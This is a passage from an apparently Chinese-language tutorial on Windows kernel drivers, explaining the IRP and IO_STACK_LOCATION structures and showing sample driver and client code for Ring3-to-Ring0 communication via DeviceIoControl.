Function...\\n&quot;);\t/*\t\t处理自己的业务\t*/    \tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\tpIrp-&gt;IoStatus.Information = 0;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;\n\n\n参数：\n1）设备对象指针\n2）IRP指针\n\nIRP是一个结构体，通过指针可以指向IRP内部的一个字段IoStatus（_IO_STATUS_BLOCK结构），该结构中有两个字段：\n1）Status：三环程序调用GetLastError得到的就是这个值\n2）Information：返回给3环多少数据，没有则填0\n\nIoCompleteRequest：表示调用方已完成所有I&#x2F;O请求处理操作，并将给定的IRP返回给I&#x2F;O管理器\n\n\n以上是必须设置的值&#x2F;执行的语句，完成后，即可\n代码实现有了以上基础后就可以实现简单的3环和0环的通信了，这里附上代码：\nRing01234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &quot;ntifs.h&quot;#define DEVICE_NAME L&quot;\\\\Device\\\\MyDevice&quot;#define SYM_LINK_NAME L&quot;\\\\??\\\\MyRing3Device&quot;#define OPER1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj);NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);//Driver Entry                                   NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING RegistryPath) &#123;\tDbgPrint(&quot;Driver is running!\\n&quot;);\tPDEVICE_OBJECT pDeviceObj = NULL;\tNTSTATUS status = 0;\t//Create Deivce Object\tUNICODE_STRING DeviceName;\tRtlInitUnicodeString(&amp;DeviceName, DEVICE_NAME);\tstatus = IoCreateDevice(pDriverObj,\t\t0,\t\t&amp;DeviceName,\t\tFILE_DEVICE_UNKNOWN,\t\t0,\t\tFALSE,\t\t&amp;pDeviceObj); \tif (status != STATUS_SUCCESS) &#123;\t\tDbgPrint(&quot;Device Create Failed!\\n&quot;);\t\treturn status;\t&#125;\telse &#123;\t\tDbgPrint(&quot;Device Create Success!\\n&quot;);\t&#125;\t//Set Communicate Ways\t//注意这里一定要用&quot;|=&quot;, 而不能直接用&quot;=&quot;,因为在创建Device\tpDeviceObj-&gt;Flags |= DO_BUFFERED_IO;\t//Create Symbollic Link\tUNICODE_STRING SymbolicLinkName;\tRtlInitUnicodeString(&amp;SymbolicLinkName, SYM_LINK_NAME);\tIoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);\t//Set Dispatch Function\tpDriverObj-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;\tpDriverObj-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;\t//Set Unload Function\tpDriverObj-&gt;DriverUnload = Drvier_Unload;\treturn STATUS_SUCCESS;&#125;NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp Create Dispatch Function...\\n&quot;);\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\tpIrp-&gt;IoStatus.Information = 0;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp Close Dispatch Function...\\n&quot;);\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\tpIrp-&gt;IoStatus.Information = 0;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj) &#123;\t//Delete SymbolicLink\tUNICODE_STRING SymbolicLinkName;\tRtlInitUnicodeString(&amp;SymbolicLinkName, SYM_LINK_NAME);\tIoDeleteSymbolicLink(&amp;SymbolicLinkName);\t//Delete Deivce\tIoDeleteDevice(pDriverObj-&gt;DeviceObject);\tDbgPrint(&quot;Unload Success!\\n&quot;);&#125;\n\nRing31234567891011121314151617181920212223242526272829303132333435363738#include &quot;stdafx.h&quot;#include &quot;Windows.h&quot;#include &quot;winioctl.h&quot;#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)#define SYM_LINK_NAME L&quot;\\\\\\\\.\\\\MyRing3Device&quot;int main(int argc, char* argv[])&#123;\t//Call IRP_MJ_CREATE\tgetchar();\tHANDLE hDevice = CreateFileW(\t\tSYM_LINK_NAME, \t\tGENERIC_READ | GENERIC_WRITE, \t\t0,\t\tNULL, \t\tOPEN_EXISTING, \t\tFILE_ATTRIBUTE_NORMAL, \t\tNULL);\t\tif (hDevice == INVALID_HANDLE_VALUE)&#123;\t\tprintf(&quot;Create File Failed!&quot;);\t\tgetchar();\t\treturn -1;\t&#125; else &#123;\t\tprintf(&quot;Create File Success!&quot;);\t&#125;\t//Call IRP_MJ_CLOSE\tgetchar();\tBOOL bCH = CloseHandle(hDevice);\tif(bCH != 0)&#123;\t\tprintf(&quot;Close File Success!&quot;);\t&#125;\tgetchar();\treturn 0;&#125;\n\n初探IRP一个IRP，用于在处理该I&#x2F;O请求的过程中代表该请求。\nIRP结构IRP对象从一个I&#x2F;O请求被发起时开始存在，一直到该I&#x2F;O请求被完成或者取消为止，在此过程中，会有多方操纵此IRP对象，包括I&#x2F;O管理器、即插即用管理器、电源管理器以及一个或多个驱动程序等。Windows I&#x2F;O系统本质上支持异步I&#x2F;O请求，所以，IRP对象必须携带足够多的环境信息，以便能够描述一个I&#x2F;O请求的所有状态。下面来研究一下IRP这个结构。\n\n看上去结构并不复杂，但其中有很多字段包含了结构体，结构体内又内嵌了结构体和联合体，下面结合官方文档中结构的定义来分析（写入到注释中）\n1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859typedef struct _IRP &#123;  CSHORT                    Type;\t\t//IRP类型，等于IO_TYPE_IRP宏  USHORT                    Size;\t\t//IRP大小  PMDL                      MdlAddress;\t\t//该I/O请求的用户缓冲区的MDL，仅用于“直接I/O”类型  ULONG                     Flags;\t\t//用于记录各种标志  union &#123;    struct _IRP     *MasterIrp;\t\t\t//若这是一个关联IRP，则指向主IRP    __volatile LONG IrpCount;\t\t\t//若这是一个主IRP，则必须先完成多少个关联IRP    PVOID           SystemBuffer;\t\t//该操作被缓冲起来，指向系统地址空间缓冲区的地址  &#125; AssociatedIrp;  LIST_ENTRY                ThreadListEntry;\t//链表项，可以加入到线程的未完成I/O请求链表中  IO_STATUS_BLOCK           IoStatus;\t\t//I/O操作的状态  KPROCESSOR_MODE           RequestorMode;\t//内核模式I/O请求或用户模式I/O请求  BOOLEAN                   PendingReturned;\t//未完成返回  CHAR                      StackCount;\t\t//栈单元（IO_STACK_LOCATION）计数  CHAR                      CurrentLocation;\t//当前栈单元位置  BOOLEAN                   Cancel;\t\t//该I/O请求是否已被取消  KIRQL                     CancelIrql;\t\t//取消自旋锁在哪级IRQL上被获取  CCHAR                     ApcEnvironment;\t//用于当该IRP被初始化时保存APC环境  UCHAR                     AllocationFlags;\t//该IRP内存的分配控制标志  PIO_STATUS_BLOCK          UserIosb;\t\t//用户的I/O状态块  PKEVENT                   UserEvent;\t\t//用户事件对象  union &#123;    struct &#123;      union &#123;        PIO_APC_ROUTINE UserApcRoutine;\t\t//当I/O请求完成时执行的APC例程        PVOID           IssuingProcess;\t\t      &#125;;      PVOID UserApcContext;\t\t\t//传递给UserApcRoutine的环境参数    &#125; AsynchronousParameters;    LARGE_INTEGER AllocationSize;\t\t//分配块的大小  &#125; Overlay;  __volatile PDRIVER_CANCEL CancelRoutine;\t//若是可取消的I/O请求，该域包含了取消时调用的例程  PVOID                     UserBuffer;\t\t//调用者（即发起者，往往是3环程序）提供的输出缓冲区地址    //以下Tail联合成员用于当I/O管理器处理该I/O请求时存放各种工作信息  union &#123;    struct &#123;      union &#123;        KDEVICE_QUEUE_ENTRY DeviceQueueEntry;\t//设备队列项        struct &#123;          PVOID DriverContext[4];\t\t//由驱动程序解释和使用        &#125;;      &#125;;      PETHREAD     Thread;\t\t\t//指向发起者线程的EHTREAD      PCHAR        AuxiliaryBuffer;\t\t//辅助缓冲区      struct &#123;        LIST_ENTRY ListEntry;\t\t\t//存放到完成队列中的链表项        union &#123;          struct _IO_STACK_LOCATION *CurrentStackLocation;\t//指向当前栈单元，驱动程序不可直接访问          ULONG\t\tPacketType;\t\t//Minipacket的类型\t\t        &#125;;      &#125;;      PFILE_OBJECT OriginalFileObject;\t\t//指向原始的文件对象    &#125; Overlay;    KAPC  Apc;\t\t\t\t\t//特殊内核模式APC或发起者的APC    PVOID CompletionKey;\t\t\t//完成键，用于标识在不同文件句柄上的I/O请求  &#125; Tail;&#125; IRP;\n\n根据注释，可以大致了解IRP结构各个字段的含义及作用，这里主要介绍几个接下来会用到的：\n\nAssociatedIrp.SystemBuffer：根据定义，可以发现它是一个指向系统地址空间缓冲区的指针。这个系统地址空间缓冲区又是什么？在前一篇中，我们曾介绍过，在创建完设备对象后，需要设置设备对象的Flags字段，也就是设置数据传输方式。而这个SystemBuffer字段，就是在采用缓冲区方式读写（DO_BUFFERED_IO）时，指向的内核空间中分配的一块用于数据复制、交换的内存\n\nMdlAddress：和SystemBuffer类似，这个字段也是在通过缓冲区处理I&#x2F;O请求时，与设置的数据传输方式有关，这个字段在设备对象采用直接方式读写（DO_DIRECT_IO）时有效。当使用这种方式进行数据读写时，I&#x2F;O请求的发起者调用IoAllocateMdl函数申请一个MDL（Memory Descriptor List，内存描述符链表），将调用者指定的缓冲区的物理页面构成一个MDL，以便于设备驱动程序使用DMA方式来传输数据。这个字段就是记录了一个I&#x2F;O请求所使用的MDL。\n\nUserBuffer：同上。当设备对象采用的是默认方式读写（NEITHER_IO）时，就会使用这个字段。此时I&#x2F;O管理器或者I&#x2F;O请求的发起者不负责缓冲区管理工作，而由驱动程序自行决定该如何使用缓冲区。其中输出缓冲区的指针放在该字段内，缓冲区本身不做任何处理。\n\nIoStatus：I&#x2F;O操作的状态。这个字段是一个_IO_STATUS_BLOCK结构体\n123456789typedef struct _IO_STATUS_BLOCK &#123;  union   &#123;    NTSTATUS  Status;    PVOID  Pointer;  &#125;;  ULONG_PTR  Information;&#125; IO_STATUS_BLOCK, *PIO_STATUS_BLOCK;\n\n1）Status：表示IRP的完成状态，如果三环程序调用完后发生了错误，想通过GetLastError函数来获取错误码，实际上获取到的就是这个Status的值，也就是说，我们自己在驱动中编写特定IRP对应的派遣函数的话，是可以设置它的错误码的。\n2）Information：这个数，决定了返回给3环多少数据。某些3环函数，会传入一部分数据进来（IN类型的参数），也会接收一部分数据（OUT类型的参数）。例如，3环传进来一个CHAR数组，有8个元素，但是我们在该函数的派遣函数中设置的Information的值是2，最后这个数组返回到3环时，就只有2个元素了。具体可以参考后面的程序演示部分。\n\n\n栈单元实际上，IRP数据结构仅仅是一个I&#x2F;O请求的固定描述部分，另一部分是一个或者多个栈单元。每个栈单元针对单个驱动程序，I&#x2F;O管理器在处理一个I&#x2F;O请求时，根据目标设备对象(DeviceObject)的StackSize域，可以知道最多有多少个驱动程序需要参与到该I&#x2F;O请求的处理过程中。\n\n下面来看一下栈单元这个结构：\n\n看上去，这个结构并不复杂，但实际上要注意一下Parameters这个域，这是一个联合体，包含了不同IRP对应的3环函数原型所需的参数，一起来看一下：\n123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206union &#123;    struct &#123;      PIO_SECURITY_CONTEXT     SecurityContext;      ULONG                    Options;      USHORT POINTER_ALIGNMENT FileAttributes;      USHORT                   ShareAccess;      ULONG POINTER_ALIGNMENT  EaLength;    &#125; Create;    struct &#123;      PIO_SECURITY_CONTEXT          SecurityContext;      ULONG                         Options;      USHORT POINTER_ALIGNMENT      Reserved;      USHORT                        ShareAccess;      PNAMED_PIPE_CREATE_PARAMETERS Parameters;    &#125; CreatePipe;    struct &#123;      PIO_SECURITY_CONTEXT        SecurityContext;      ULONG                       Options;      USHORT POINTER_ALIGNMENT    Reserved;      USHORT                      ShareAccess;      PMAILSLOT_CREATE_PARAMETERS Parameters;    &#125; CreateMailslot;    struct &#123;      ULONG                   Length;      ULONG POINTER_ALIGNMENT Key;      ULONG                   Flags;      LARGE_INTEGER           ByteOffset;    &#125; Read;    struct &#123;      ULONG                   Length;      ULONG POINTER_ALIGNMENT Key;      ULONG                   Flags;      LARGE_INTEGER           ByteOffset;    &#125; Write;    struct &#123;      ULONG                   Length;      PUNICODE_STRING         FileName;      FILE_INFORMATION_CLASS  FileInformationClass;      ULONG POINTER_ALIGNMENT FileIndex;    &#125; QueryDirectory;    struct &#123;      ULONG                   Length;      ULONG POINTER_ALIGNMENT CompletionFilter;    &#125; NotifyDirectory;    struct &#123;      ULONG                                                Length;      ULONG POINTER_ALIGNMENT                              CompletionFilter;      DIRECTORY_NOTIFY_INFORMATION_CLASS POINTER_ALIGNMENT DirectoryNotifyInformationClass;    &#125; NotifyDirectoryEx;    struct &#123;      ULONG                                    Length;      FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass;    &#125; QueryFile;    struct &#123;      ULONG                                    Length;      FILE_INFORMATION_CLASS POINTER_ALIGNMENT FileInformationClass;      PFILE_OBJECT                             FileObject;      union &#123;        struct &#123;          BOOLEAN ReplaceIfExists;          BOOLEAN AdvanceOnly;        &#125;;        ULONG  ClusterCount;        HANDLE DeleteHandle;      &#125;;    &#125; SetFile;    struct &#123;      ULONG                   Length;      PVOID                   EaList;      ULONG                   EaListLength;      ULONG POINTER_ALIGNMENT EaIndex;    &#125; QueryEa;    struct &#123;      ULONG Length;    &#125; SetEa;    struct &#123;      ULONG                                  Length;      FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass;    &#125; QueryVolume;    struct &#123;      ULONG                                  Length;      FS_INFORMATION_CLASS POINTER_ALIGNMENT FsInformationClass;    &#125; SetVolume;    struct &#123;      ULONG                   OutputBufferLength;      ULONG POINTER_ALIGNMENT InputBufferLength;      ULONG POINTER_ALIGNMENT FsControlCode;      PVOID                   Type3InputBuffer;    &#125; FileSystemControl;    struct &#123;      PLARGE_INTEGER          Length;      ULONG POINTER_ALIGNMENT Key;      LARGE_INTEGER           ByteOffset;    &#125; LockControl;    struct &#123;      ULONG                   OutputBufferLength;      ULONG POINTER_ALIGNMENT InputBufferLength;      ULONG POINTER_ALIGNMENT IoControlCode;      PVOID                   Type3InputBuffer;    &#125; DeviceIoControl;    struct &#123;      SECURITY_INFORMATION    SecurityInformation;      ULONG POINTER_ALIGNMENT Length;    &#125; QuerySecurity;    struct &#123;      SECURITY_INFORMATION SecurityInformation;      PSECURITY_DESCRIPTOR SecurityDescriptor;    &#125; SetSecurity;    struct &#123;      PVPB           Vpb;      PDEVICE_OBJECT DeviceObject;    &#125; MountVolume;    struct &#123;      PVPB           Vpb;      PDEVICE_OBJECT DeviceObject;    &#125; VerifyVolume;    struct &#123;      struct _SCSI_REQUEST_BLOCK *Srb;    &#125; Scsi;    struct &#123;      ULONG                       Length;      PSID                        StartSid;      PFILE_GET_QUOTA_INFORMATION SidList;      ULONG                       SidListLength;    &#125; QueryQuota;    struct &#123;      ULONG Length;    &#125; SetQuota;    struct &#123;      DEVICE_RELATION_TYPE Type;    &#125; QueryDeviceRelations;    struct &#123;      const GUID *InterfaceType;      USHORT     Size;      USHORT     Version;      PINTERFACE Interface;      PVOID      InterfaceSpecificData;    &#125; QueryInterface;    struct &#123;      PDEVICE_CAPABILITIES Capabilities;    &#125; DeviceCapabilities;    struct &#123;      PIO_RESOURCE_REQUIREMENTS_LIST IoResourceRequirementList;    &#125; FilterResourceRequirements;    struct &#123;      ULONG                   WhichSpace;      PVOID                   Buffer;      ULONG                   Offset;      ULONG POINTER_ALIGNMENT Length;    &#125; ReadWriteConfig;    struct &#123;      BOOLEAN Lock;    &#125; SetLock;    struct &#123;      BUS_QUERY_ID_TYPE IdType;    &#125; QueryId;    struct &#123;      DEVICE_TEXT_TYPE       DeviceTextType;      LCID POINTER_ALIGNMENT LocaleId;    &#125; QueryDeviceText;    struct &#123;      BOOLEAN                                          InPath;      BOOLEAN                                          Reserved[3];      DEVICE_USAGE_NOTIFICATION_TYPE POINTER_ALIGNMENT Type;    &#125; UsageNotification;    struct &#123;      SYSTEM_POWER_STATE PowerState;    &#125; WaitWake;    struct &#123;      PPOWER_SEQUENCE PowerSequence;    &#125; PowerSequence;#if ...    struct &#123;      union &#123;        ULONG                      SystemContext;        SYSTEM_POWER_STATE_CONTEXT SystemPowerStateContext;      &#125;;      POWER_STATE_TYPE POINTER_ALIGNMENT Type;      POWER_STATE POINTER_ALIGNMENT      State;      POWER_ACTION POINTER_ALIGNMENT     ShutdownType;    &#125; Power;#else    struct &#123;      ULONG                              SystemContext;      POWER_STATE_TYPE POINTER_ALIGNMENT Type;      POWER_STATE POINTER_ALIGNMENT      State;      POWER_ACTION POINTER_ALIGNMENT     ShutdownType;    &#125; Power;#endif    struct &#123;      PCM_RESOURCE_LIST AllocatedResources;      PCM_RESOURCE_LIST AllocatedResourcesTranslated;    &#125; StartDevice;    struct &#123;      ULONG_PTR ProviderId;      PVOID     DataPath;      ULONG     BufferSize;      PVOID     Buffer;    &#125; WMI;    struct &#123;      PVOID Argument1;      PVOID Argument2;      PVOID Argument3;      PVOID Argument4;    &#125; Others;  &#125; Parameters;\n\n那这个Parameters该如何用呢？举个例子，假设3环程序调用了DeviceIoControl函数，在0环，就会构造一个IRP_MJ_DEVICE_CONTROL这个类型的IRP，然后我们就可以构建它的派遣函数了。在派遣函数中，当我们获得了当前驱动的栈单元时，就可以通过如下语句访问3环函数DeviceIoControl的参数了，例如：\n12345//获取IO_STACK_LOCATIONPIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);//获取3环函数参数ULONG InputBufferLength = pStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;ULONG FsControlCode = pStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;\n\n其中，IoGetCurrentIrpStackLocation函数，将Irp指针传进去，可以获取当前驱动程序对应的栈单元。接着就可以通过栈单元获取我们想要的参数了\n3环与0环通信（升级）操作码在了解了上述知识后，我们就可以对前一篇文章中的代码进行一次升级，更清晰的看到3环和0环的信息交互过程。在此之前，我们需要了解一个操作码。本次实验会在3环程序中新增一个DeviceIoControl函数，因为这个函数能既有传入的参数，也有输出的参数，可以比较直观的看明白3环和0环交互的数据。具体定义如图：\n\n其中需要解释一下的，就是这个dwIoControlCode参数，这个就相当于Switch语句中传入的那个参数，用来判断程序执行流程用的，当操作码不同时，执行的功能也不同，操作码定义如下：\n12#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)\n\nCTL_CODE函数，会接收这四个参数，并通过某一种算法，生成一个四字节的操作码，3环和0环中用的是同一套操作码，其中第二个参数，这个值必须选定一个大于等于0x800的值，之前的值由系统保留使用。\n\n\n\n\n\n\n\n\n\n以下宏可用于从 IOCTL 代码中提取 16 位 DeviceType 和 2 位 TransferType 字段：\n#define DEVICE_TYPE_FROM_CTL_CODE(ctrlCode)   (((ULONG)(ctrlCode &amp; 0xffff0000)) &gt;&gt; 16)#define METHOD_FROM_CTL_CODE(ctrlCode)        ((ULONG)(ctrlCode &amp; 3))\n新增代码本次实验新增的代码，就是在3环程序增加了DeviceIoControl这个函数，以及相应的驱动增加了派遣函数。具体变化如下：\nRing3新增部分：\n123456789101112131415161718192021#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)//Call IRP_MY_DEVICE_CONTROL\tgetchar();\tchar pInputBuffer[20] = &#123;1, 2, 4, 8, 16, 32, 64, 0&#125;;\tchar pOutputBuffer[20] = &#123;0&#125;;\tDWORD dwReturnSize = 0;    BOOL bDIC = DeviceIoControl(hDevice, OPCODE2, pInputBuffer, 8, pOutputBuffer, 20, &amp;dwReturnSize, NULL);\tif(bDIC != 0)&#123;\t\tprintf(&quot;ReturnSize: %x\\n&quot;, dwReturnSize);\t\tprintf(&quot;OutputBuffer: &quot;);\t\tfor(int i = 0; i &lt; dwReturnSize; i++)&#123;\t\t\tprintf(&quot;%x &quot;, pOutputBuffer[i]);\t\t&#125;\t&#125;\telse &#123;\t\tprintf(&quot;Communicate Failed!\\n&quot;);\t\treturn -1;\t&#125;\tprintf(&quot;\\nRing3 And Ring0 Communicate Success!\\n&quot;);\n\n代码中传入一个初始化了8个字节的数组，并且用另一个空数组来接收0环的数据，DeviceIoControl执行完后，根据返回的长度大小，以及返回的Buffer，来打印返回的数据。\nRing0新增部分：\n12345678910111213141516171819202122232425262728293031323334#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)NTSTATUS IrpDeviceControlProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp DeviceControl Dispatch Function...\\n&quot;);\t//获取缓冲区数据\tPVOID pSystemBuffer = pIrp-&gt;AssociatedIrp.SystemBuffer;\t//获取IO_STACK_LOCATION\tPIO_STACK_LOCATION pStackLocation = IoGetCurrentIrpStackLocation(pIrp);\tULONG InputBufferLength = pStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;\tULONG FsControlCode = pStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;\t//判断操作码\tswitch (FsControlCode)\t&#123;\tcase OPCODE1:\t\tDbgPrint(&quot;不打印操作码&quot;);\t\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\t\tpIrp-&gt;IoStatus.Information = 2;\t\tbreak;\tcase OPCODE2:\t\tDbgPrint(&quot;操作码：%x\\n&quot;, FsControlCode);\t\tfor (UINT32 i = 0; i &lt; InputBufferLength; i++) &#123;\t\t\tDbgPrint(&quot;Ring3 Data: %x\\n&quot;, ((PUCHAR)pSystemBuffer)[i]);\t\t&#125;\t\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\t\tpIrp-&gt;IoStatus.Information = 5;\t\tbreak;\t&#125;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;\n\n来简要看一下派遣函数的执行流程：\n\n由于在设备对象的Flags字段定义过缓冲区读取的类型是（DO_BUFFERED_IO），因此我们可以直接从AssociatedIrp.SystemBuffer中读取3环传入的数据，也就是DeviceIoControl中pInputBuffer参数指向的数据。\n\n通过IoGetCurrentIrpStackLocation函数获取到栈单元，再通过栈单元获取到Parameters中DeviceIoControl结构体里对应的参数\n123456struct &#123;      ULONG                   OutputBufferLength;      ULONG POINTER_ALIGNMENT InputBufferLength;      ULONG POINTER_ALIGNMENT IoControlCode;      PVOID                   Type3InputBuffer;    &#125; DeviceIoControl;\n\n这里我们仅取操作码IoControlCode，用于判断执行流程；以及InputBufferLength，用于打印传入数据\n\n然后就是根据操作码的不同，执行不同的流程了：\n1）操作码1：不做任何操作，向3环返回2字节大小的数据\n2）操作码2：打印操作码的值；根据传入数据的长度，打印传入的数据；向3环返回5字节大小的数据\n\n\n完整代码Ring3部分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#include &quot;stdafx.h&quot;#include &quot;Windows.h&quot;#include &quot;winioctl.h&quot;#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN, 0x900, METHOD_BUFFERED, FILE_ANY_ACCESS)#define SYM_LINK_NAME L&quot;\\\\\\\\.\\\\MyRing3Device&quot;int main(int argc, char* argv[])&#123;\t//Call IRP_MJ_CREATE\tgetchar();\tHANDLE hDevice = CreateFileW(\t\tSYM_LINK_NAME, \t\tGENERIC_READ | GENERIC_WRITE, \t\t0,\t\tNULL, \t\tOPEN_EXISTING, \t\tFILE_ATTRIBUTE_NORMAL, \t\tNULL);\t\tif (hDevice == INVALID_HANDLE_VALUE)&#123;\t\tprintf(&quot;Create File Failed!&quot;);\t\tgetchar();\t\treturn -1;\t&#125; else &#123;\t\tprintf(&quot;Create File Success!&quot;);\t&#125;\t//Call IRP_MY_DEVICE_CONTROL\tgetchar();\tchar pInputBuffer[20] = &#123;1, 2, 4, 8, 16, 32, 64, 0&#125;;\tchar pOutputBuffer[20] = &#123;0&#125;;\tDWORD dwReturnSize = 0;    BOOL bDIC = DeviceIoControl(hDevice, OPCODE2, pInputBuffer, 8, pOutputBuffer, 20, &amp;dwReturnSize, NULL);\tif(bDIC != 0)&#123;\t\tprintf(&quot;ReturnSize: %x\\n&quot;, dwReturnSize);\t\tprintf(&quot;OutputBuffer: &quot;);\t\tfor(int i = 0; i &lt; dwReturnSize; i++)&#123;\t\t\tprintf(&quot;%x &quot;, pOutputBuffer[i]);\t\t&#125;\t&#125;\telse &#123;\t\tprintf(&quot;Communicate Failed!\\n&quot;);\t\treturn -1;\t&#125;\tprintf(&quot;\\nRing3 And Ring0 Communicate Success!\\n&quot;);\t//Call IRP_MJ_CLOSE\tgetchar();\tBOOL bCH = CloseHandle(hDevice);\tif(bCH != 0)&#123;\t\tprintf(&quot;Close File Success!&quot;);\t&#125;\tgetchar();\treturn 0;&#125;\n\nRing0部分123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120#include &quot;ntifs.h&quot;#define DEVICE_NAME L&quot;\\\\Device\\\\MyDevice&quot;#define SYM_LINK_NAME L&quot;\\\\??\\\\MyRing3Device&quot;#define OPCODE1 CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_BUFFERED,FILE_ANY_ACCESS)#define OPCODE2 CTL_CODE(FILE_DEVICE_UNKNOWN,0x900,METHOD_BUFFERED,FILE_ANY_ACCESS)VOID Drvier_Unload(PDRIVER_OBJECT pDriverObj);NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);NTSTATUS IrpDeviceControlProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp);//Driver Entry                                   NTSTATUS DriverEntry(PDRIVER_OBJECT pDriverObj, PUNICODE_STRING RegistryPath) &#123;\tDbgPrint(&quot;Driver is running!\\n&quot;);\tPDEVICE_OBJECT pDeviceObj = NULL;\tNTSTATUS status = 0;\t//Create Deivce Object\tUNICODE_STRING DeviceName;\tRtlInitUnicodeString(&amp;DeviceName, DEVICE_NAME);\tstatus = IoCreateDevice(pDriverObj,\t\t0,\t\t&amp;DeviceName,\t\tFILE_DEVICE_UNKNOWN,\t\t0,\t\tFALSE,\t\t&amp;pDeviceObj);\tif (status != STATUS_SUCCESS) &#123;\t\tDbgPrint(&quot;Device Create Failed!\\n&quot;);\t\treturn status;\t&#125;\telse &#123;\t\tDbgPrint(&quot;Device Create Success!\\n&quot;);\t&#125;\t//Set Communicate Ways\t//注意这里一定要用&quot;|=&quot;, 而不能直接用&quot;=&quot;,因为在创建Device时会给Fllags赋上一个初值\tpDeviceObj-&gt;Flags |= DO_BUFFERED_IO;\t//Create Symbollic Link\tUNICODE_STRING SymbolicLinkName;\tRtlInitUnicodeString(&amp;SymbolicLinkName, SYM_LINK_NAME);\tIoCreateSymbolicLink(&amp;SymbolicLinkName, &amp;DeviceName);\t//Set Dispatch Function\tpDriverObj-&gt;MajorFunction[IRP_MJ_CREATE] = IrpCreateProc;\tpDriverObj-&gt;MajorFunction[IRP_MJ_CLOSE] = IrpCloseProc;\tpDriverObj-&gt;MajorFunction[IRP_MJ_DEVICE_CONTROL] = IrpDeviceControlProc;\t//Set Unload Function\tpDriverObj-&gt;DriverUnload = Drvier_Unload;\treturn STATUS_SUCCESS;&#125;NTSTATUS IrpCreateProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp Create Dispatch Function...\\n&quot;);\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\tpIrp-&gt;IoStatus.Information = 0;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;NTSTATUS IrpCloseProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp Close Dispatch Function...\\n&quot;);\tpIrp-&gt;IoStatus.Status = STATUS_SUCCESS;\tpIrp-&gt;IoStatus.Information = 0;\tIoCompleteRequest(pIrp, IO_NO_INCREMENT);\treturn STATUS_SUCCESS;&#125;NTSTATUS IrpDeviceControlProc(PDEVICE_OBJECT pDeviceObj, PIRP pIrp) &#123;\tDbgPrint(&quot;Irp DeviceControl Dispatch 